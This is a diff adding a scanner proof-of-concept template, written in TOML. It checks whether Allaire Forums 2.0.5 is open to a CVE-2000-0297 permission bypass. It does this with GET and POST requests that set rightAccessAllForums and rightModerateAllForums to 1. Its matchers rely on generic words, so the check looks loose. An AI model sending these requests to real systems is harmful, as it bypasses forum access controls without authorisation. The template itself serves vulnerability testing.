@@ -1,0 +1,50 @@
+[info]
+author = "ave"
+description = "检测 Allaire Forums 2.0.5 是否存在 rightAccessAllForums 或 rightModerateAllForums 参数导致的访问控制绕过漏洞。远程攻击者可通过构造特制HTTP请求参数绕过安全讨论区的权限验证。"
+id = "POC-AVE-2000-0287"
+name = "Allaire Forums 安全绕过 PoC"
+severity = "medium"
+tags = ["ave-2000-0287"]
+vuln_id = [
+    "CVE-2000-0297",
+    "AVE-2000-0287",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/forums/index.cfm?rightAccessAllForums=1"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "rightAccessAllForums",
+    "rightModerateAllForums",
+    "Forums",
+    "conference",
+]
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/forums/index.cfm"
+protocol = "http"
+
+[poc.requests.body]
+content = "rightAccessAllForums=1&rightModerateAllForums=1"
+type = "form"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "rightAccessAllForums",
+    "rightModerateAllForums",
+    "Forums",
+    "conference",
+]
